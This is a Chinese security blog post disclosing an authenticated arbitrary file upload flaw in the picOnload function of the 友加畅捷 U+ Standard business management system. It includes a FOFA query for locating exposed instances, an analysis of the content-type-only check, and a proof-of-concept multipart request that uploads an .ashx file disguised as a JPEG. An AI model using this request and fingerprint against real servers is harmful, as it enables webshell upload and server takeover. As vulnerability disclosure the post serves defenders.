---
title: "友加畅捷管理系统U+标准版 picOnload 任意文件上传漏洞（鉴权后）"
source: https://mrxn.net/jswz/youjiasoft-Other-picOnload-upload-rce.html
asset_dir: assets/友加畅捷管理系统u+标准版-piconload-任意文件上传漏洞（鉴权后）
---

# 友加畅捷管理系统U+标准版 picOnload 任意文件上传漏洞（鉴权后）

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/2 11:20
- 622浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

软件

鉴权

SQL

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理[软件](#)，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞扫描服务

该系统在`picOnload`功能模块中存在[任意文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。攻击者可以利用此漏洞，通过构造恶意请求，绕过系统对文件上传的限制，将恶意文件（如WebShell）上传到服务器。一旦恶意文件成功上传，攻击者即可远程[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，导致敏感数据泄露、系统被篡改或更严重的网络入侵事件。

# 影响版本

13.7004.1053.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

直接查看 `OtherController` 下的 `picOnload` 方法的实现逻辑

网络安全

[![友加畅捷管理系统U+标准版 picOnload 任意文件上传漏洞（鉴权后）](images/img-001-a77e4ac494de.webp)](https://image.mrxn.net/0cfe7f4154fb451b9a1e92ae0ee6fd18.webp)

- 仅通过 `ContentType` 进行文件类型验证，允许的文件类型：gif、jpeg、bmp、pjpeg、x-png
- 使用 `Path.GetExtension(file.FileName)` 获取扩展名
- 文件存储在Web可访问目录 `../Content/TempImg/`
- 回显重命名后的文件名及路径信息

综上这些因素导致[任意文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

深入探索

安全

Docker加速服务

SQL注入防护

# 漏洞复现

```
POST /Other/picOnload?SessionID=xxxx HTTP/1.1
Host: youjiasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123
Cookie: ASP.NET_SessionId=xxxx;

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="1.ashx"
Content-Type: image/jpeg

xxx
------WebKitFormBoundary123--
```

[![友加畅捷管理系统U+标准版 picOnload 任意文件上传漏洞（鉴权后）](images/img-002-ecd2a27a548e.webp)](https://image.mrxn.net/786a481b352542a6ab34ede402551f2d.webp)

访问回显的文件路径执行任意代码并删除自身

物流软件安全

[![友加畅捷管理系统U+标准版 picOnload 任意文件上传漏洞（鉴权后）](images/img-003-d3f8da6c7c72.webp)](https://image.mrxn.net/134442e007c14eb4902deda58e845141.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
